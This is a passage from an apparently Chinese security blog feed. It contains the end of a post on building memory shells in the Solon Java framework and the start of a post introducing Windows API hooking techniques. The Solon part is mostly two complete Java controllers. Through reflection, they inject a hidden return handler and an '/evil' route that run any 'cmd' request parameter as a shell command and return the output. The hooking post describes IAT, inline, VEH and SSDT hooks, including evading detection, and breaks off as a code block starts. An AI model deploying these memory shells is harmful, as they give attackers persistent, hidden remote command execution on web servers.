class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Controller;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Mapping;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Param;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.ChainManager;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.Action;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.ActionReturnHandler;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.Context;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ActionReturnHandlerMemoryShellController</span> &#123;</span><br><span class="line">    <span class="meta">@Mapping(&quot;/inject-return-handler&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@Param(defaultValue = &quot;world&quot;)</span> String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> Context.current();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">_request</span> <span class="operator">=</span> getfieldobj(ctx,<span class="string">&quot;_request&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">request</span> <span class="operator">=</span> getfieldobj(_request,<span class="string">&quot;request&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">serverHandler</span> <span class="operator">=</span> getfieldobj(request,<span class="string">&quot;serverHandler&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> getfieldobj(serverHandler,<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">arg$1</span> <span class="operator">=</span> getfieldobj(handler,<span class="string">&quot;arg$1&quot;</span>);</span><br><span class="line">        <span class="type">ChainManager</span> <span class="variable">_chainManager</span> <span class="operator">=</span> (ChainManager) getfieldobj(arg$<span class="number">1</span>,<span class="string">&quot;_chainManager&quot;</span>);</span><br><span class="line">        _chainManager.addReturnHandler(<span class="keyword">new</span> <span class="title class_">EvilReturnHandler</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Inject ActionReturnHandler Memory Shell Successfully!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getfieldobj</span><span class="params">(Object obj, String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(Filename);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">fieldobj</span> <span class="operator">=</span> field.get(obj);</span><br><span class="line">            <span class="keyword">return</span> fieldobj;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getSuperclass().getDeclaredField(Filename);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">fieldobj</span> <span class="operator">=</span> field.get(obj);</span><br><span class="line">            <span class="keyword">return</span> fieldobj;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">EvilReturnHandler</span> <span class="keyword">implements</span> <span class="title class_">ActionReturnHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">matched</span><span class="params">(Context ctx, Class&lt;?&gt; returnType)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (ctx.param(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, ctx.param(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, ctx.param(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    ctx.output(output);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">returnHandle</span><span class="params">(Context ctx, Action action, Object returnValue)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729591297296-f59f2d67-80c0-4428-9fe6-0e1132a860d9.png"></p><h3 id="RouterHandler"><a href="#RouterHandler" class="headerlink" title="RouterHandler"></a>RouterHandler</h3><p><font style="color:#000000;">在Solon请求处理过程示意图中，注意到有一个Handler为RouterHandler，RouterHandler是Solon框架中的一个类，它实现了Handler接口，充当路由处理器的角色。在Solon框架中，RouterHandler负责处理HTTP请求和响应的路由逻辑。</font></p><p>打断点跟进分析一下org.noear.solon.core.route.RouterHandler#handle方法，在this.router中存储着当前所有的路径信息，包括对应作用的类和方法，请求路径和请求方式。</p><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729593416300-1a046718-25d2-4cb2-a3cd-c3e4e79ef3f2.png"></p><p><font style="color:#000000;">跟进org.noear.solon.core.route.RouterDefault#add方法，如果能够动态的向table中添加一条RouterDefault，即可添加一个恶意路由，从而实现内存马。</font></p><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729600958661-2650506a-98e3-485d-b1fd-90ca1f0b9a1d.png"></p><p><font style="color:#000000;">RouterHandler内存马实现代码如下。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Controller;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Mapping;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Param;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.AppContext;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.BeanWrap;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.Context;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.Handler;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.MethodType;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.mvc.ActionDefault;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.route.RouterDefault;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RouterHandlerMemoryShellController</span> &#123;</span><br><span class="line">    <span class="meta">@Mapping(&quot;/inject-router-handler&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@Param(defaultValue = &quot;world&quot;)</span> String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> Context.current();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">_request</span> <span class="operator">=</span> getfieldobj(ctx,<span class="string">&quot;_request&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">request</span> <span class="operator">=</span> getfieldobj(_request,<span class="string">&quot;request&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">serverHandler</span> <span class="operator">=</span> getfieldobj(request,<span class="string">&quot;serverHandler&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> getfieldobj(serverHandler,<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">arg$1</span> <span class="operator">=</span> getfieldobj(handler,<span class="string">&quot;arg$1&quot;</span>);</span><br><span class="line">        <span class="type">AppContext</span> <span class="variable">appContext</span> <span class="operator">=</span> (AppContext) getfieldobj(arg$<span class="number">1</span>,<span class="string">&quot;_context&quot;</span>);</span><br><span class="line">        <span class="type">RouterDefault</span> <span class="variable">_router</span> <span class="operator">=</span> (RouterDefault) getfieldobj(arg$<span class="number">1</span>,<span class="string">&quot;_router&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanWrap</span> <span class="variable">beanWrap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanWrap</span>(appContext, EvilClass.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> EvilClass.class.getDeclaredMethod(<span class="string">&quot;MemoryShell&quot;</span>);</span><br><span class="line">        <span class="type">Handler</span> <span class="variable">newhandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActionDefault</span>(beanWrap, method);</span><br><span class="line">        _router.add(<span class="string">&quot;/evil&quot;</span>, MethodType.ALL, newhandler);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Inject RouterHandler Memory Shell Successfully!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getfieldobj</span><span class="params">(Object obj, String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(Filename);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">fieldobj</span> <span class="operator">=</span> field.get(obj);</span><br><span class="line">            <span class="keyword">return</span> fieldobj;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getSuperclass().getDeclaredField(Filename);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">fieldobj</span> <span class="operator">=</span> field.get(obj);</span><br><span class="line">            <span class="keyword">return</span> fieldobj;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EvilClass</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">MemoryShell</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> Context.current();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (ctx.param(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, ctx.param(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, ctx.param(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    ctx.output(output);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729603644054-cc80a6da-c57c-4d95-87ec-ef821c47aa01.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://solon.noear.org/">Solon</a></li><li><a href="https://github.com/c0ny1/java-object-searcher">Java Object Searcher</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MemoryShell </tag>
            
            <tag> Solon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hook初探</title>
      <link href="/2024/10/20/Hook/"/>
      <url>/2024/10/20/Hook/</url>
      
        <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><font style="color:#000000;">Windows系统是建立在事件驱动机制上的，整个系统都是通过消息传递实现的。Hook，中文里常常被译作“钩子”或者“挂钩”，是</font><strong><font style="color:#000000;">一种特殊的消息处理机制</font></strong><font style="color:#000000;">，它可以监视系统或者进程中的各种事件消息，截获发往目标窗口的消息并进行处理。即，Hook可以改变程序执行流程，将程序原有的执行流程拦截，更改程序流向，并可以执行自己的自定义代码。Hook可以分为</font><strong><font style="color:#000000;">线程钩子</font></strong><font style="color:#000000;">和</font><strong><font style="color:#000000;">系统钩子</font></strong><font style="color:#000000;">，线程钩子可以监视指定线程的事件消息，系统钩子监视系统中的所有线程的事件消息。</font></p><p><font style="color:#000000;">Hook技术被广泛应用于安全的多个领域，例如杀毒软件的主动防御功能，涉及到对一些敏感API的监控，就需要对这些API进行Hook；窃取密码的木马病毒，为了接收键盘的输入，需要Hook键盘消息；甚至是Windows系统及一些应用程序，在打补丁时也需要用到Hook技术。</font></p><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a><font style="color:#000000;">基本原理</font></h2><p><strong><font style="color:#000000;">在真正执行原始API之前，对程序流进行拦截，使其先执行自定义的代码后，再执行原始API调用流程</font></strong><font style="color:#000000;">。简而言之就是篡改程序的运行路径，实现执行自定义程序的目的。</font></p><p><font style="color:#000000;">例如，在calc.exe和kernel32.dll之间挂上一个钩子，将它们之间要使用的CreateFile函数替换成自定义的EvilFunc函数，即可实现想要实现的自定义功能。</font></p><p><img src="/2024/10/20/Hook/1728999047367-6824835f-796e-4eae-b5ef-b5cc92a62253.png"></p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p><font style="color:#000000;">Hook大体分为</font><strong><font style="color:#000000;">应用层Hook</font></strong><font style="color:#000000;">和</font><strong><font style="color:#000000;">内核层Hook</font></strong><font style="color:#000000;">。</font></p><ol><li><font style="color:#000000;">应用层Hook：</font><font style="color:#000000;">在Ring3层的Hook机制，主要涉及到用户态的程序和接口。这包括了对API函数的拦截和处理，例如通过IAT钩子（Import Address Table Hook）来拦截DLL的导入函数调用，或者通过Inline Hook直接在内存中修改函数的指令来实现拦截。</font><ol><li><font style="color:#000000;">消息Hook</font></li><li><font style="color:#000000;">注入Hook</font><ol><li><strong><font style="color:#000000;">IAT Hook（导入地址表钩子）</font></strong><font style="color:#000000;">：通过修改PE文件结构中的导入表来实现对特定函数调用的拦截。这种方法通常用于DLL注入，通过修改目标进程的导入表来劫持函数调用。</font></li><li><strong><font style="color:#000000;">Inline Hook（内联钩子）</font></strong><font style="color:#000000;">：直接在内存中修改函数的指令来实现拦截。这种方法通过在目标函数的指令流中插入跳转指令（如，jmp），使得函数调用被重定向到自定义的代码中。</font></li><li><strong><font style="color:#000000;">HotFix Hook（热修复钩子）</font></strong><font style="color:#000000;">：通过在函数的头部分寻找可替换的“无用”指令（例如 mov edi, edi），并将这些指令替换为跳转指令（如，EB F9）来实现拦截。这种方法不需要频繁地挂载和卸载Hook，从而避免了资源浪费，提高了效率。当需要调用原始函数时，只需跳过这个短跳转指令即可，而无需还原被替换的指令，使得Hook过程更加高效和稳定。</font></li><li><strong><font style="color:#000000;">VEH Hook（向量化异常处理钩子）</font></strong><font style="color:#000000;">：通过注册一个异常处理函数到操作系统的异常处理链表中，来实现对特定函数的拦截。当目标函数被调用时，会触发一个软件断点（如将指令修改为int 3），从而引发一个异常。VEH钩子作为异常处理程序，可以捕获这个异常，并在异常处理函数中执行自定义的代码。在处理完异常后，可以恢复原始函数的执行，或者修改寄存器和栈来改变程序的执行流程。VEH钩子的优点是它不需要修改原始函数的代码，因此可以实现无痕Hook，难以被检测工具发现。VEH钩子通常用于高级恶意软件技术，以绕过操作系统和安全软件的检测。</font></li><li><font style="color:#000000;">……</font></li></ol></li><li><font style="color:#000000;">调试Hook</font></li></ol></li><li><font style="color:#000000;">内核层Hook：</font><font style="color:#000000;">在Ring0层的Hook机制，通常涉及到更底层的系统调用和内核API的拦截。例如SSDT钩子（System Service Descriptor Table Hook），它通过修改系统服务描述符表来拦截内核API调用。</font><ol><li><strong><font style="color:#000000;">SSDT Hook（系统服务描述符表钩子）</font></strong><font style="color:#000000;">：这是一种内核层的Hook技术，通过修改SSDT表中的函数地址来拦截系统服务调用。这种方法可以用于监控和过滤系统级别的活动，如文件操作、网络通信等。</font></li><li><font style="color:#000000;">……</font></li></ol></li></ol><p><img src="/2024/10/20/Hook/1729045017221-1c2705c0-0899-47a4-b4b2-1cbcd1475214.png"></p><h2 id="常见Hook技术"><a href="#常见Hook技术" class="headerlink" title="常见Hook技术"></a>常见Hook技术</h2><h3 id="IAT-Hook"><a href="#IAT-Hook" class="headerlink" title="IAT Hook"></a>IAT Hook</h3><h4 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h4><p><strong><font style="color:#000000;">可移植可执行文件（ PE）：</font></strong><font style="color:#000000;">可移植可执行文件格式是一种文件格式，用于32位和64位版本的Windows操作系统中的可执行文件、目标代码、DLL、FON字体文件等。PE格式是一种数据结构，它封装了Windows操作系统加载器管理封装可执行代码所需的信息。</font></p><p><strong>导入地址表（</strong>**<font style="color:#000000;">Import Address Table，IAT</font>**<strong>）</strong>：<font style="color:#000000;">地址表在应用程序调用不同模块中的函数时用作查找表，它可以采用按序号导入和按名称导入两种形式。由于编译后的程序无法知道其所依赖的库的内存位置，因此每次调用API时都需要间接跳转。动态链接器在加载模块并将它们连接在一起时，会将实际地址写入IAT插槽，使它们指向相应库函数的内存位置。每个进程都有IAT表，当PE加载到内存中，系统会将被导入函数的地址写到对应的函数指针位置，通过IAT表，可以直接调用导入函数。</font></p><p><strong><font style="color:#000000;">导入名称表（Import Name Table，INT）</font></strong><font style="color:#000000;">：用于储存被导入函数的名称。加载PE时，系统会根据INT表的函数名，查找填充IAT的函数地址。</font></p><h4 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h4><p><font style="color:#000000;">IAT HOOK可以解释为</font><strong><font style="color:#000000;">操纵导入地址表，将API函数重定向到所需的内存地址</font></strong><font style="color:#000000;">，该地址可以是另一个API函数、恶意shellcode或程序代码的另一部分。要覆盖IAT中的地址，第一步是找到进程内存中IAT表的地址。查找PE文件中的任何表都需要大量的结构解析，但是查找IAT地址比大多数情况都要容易，因为它可以在PE文件可选头文件中的数据目录中找到。</font></p><p><img src="/2024/10/20/Hook/1729048487184-a966b3d2-e506-467e-8e90-ce42ab3919f4.png"></p><p><font style="color:#000000;">但是，仅仅找到导入地址表还不足以HOOK API函数。该表只包含API地址，为了替换API函数地址，还需要知道哪个条目属于将要HOOK的API函数。深入研究PE格式后可以发现，导入地址表中的地址顺序与导入名称表相同。因此，可以通过解析导入名称表来找到所需的API函数的条目编号。</font></p><p><font style="color:#000000;">在导入名称表中查找函数名需要解析PE文件的导入表中的_IMAGE_IMPORT_DESCRIPTOR结构，在解析了必要的结构并在IAT中找到API函数索引之后，在覆盖函数地址之前还需要执行另一个步骤。通常导入地址表位于内存中，只有读权限，为了覆盖表内的条目，</font><strong><font style="color:#000000;">需要将内存保护属性修改为PAGE_READWRITE</font></strong><font style="color:#000000;">。借助VirtualProtect函数，可以更改IAT的内存保护属性（或者只是需要覆盖的条目）。</font></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;        </span><br><span class="line">        DWORD   OriginalFirstThunk;     <span class="comment">// RVA 指向IMAGE_THUNK_DATA结构数组(即INT表)</span></span><br><span class="line">        &#125;;</span><br><span class="line">    DWORD   TimeDateStamp;              <span class="comment">// 时间戳   </span></span><br><span class="line">    DWORD   ForwarderChain;                     </span><br><span class="line">    DWORD   Name;                       <span class="comment">// RVA,指向dll名字,该名字已0结尾                   </span></span><br><span class="line">    DWORD   FirstThunk;                 <span class="comment">// RVA,指向IMAGE_THUNK_DATA结构数组(即IAT表)         </span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;                          </span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/Hook/1729068361556-1f89a7ca-9305-4e34-b8de-087d1c71ffdb.png"></p><p><img src="/2024/10/20/Hook/1729068508766-0c254228-b338-41b3-838b-c8ef2e3a1a90.png"></p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span 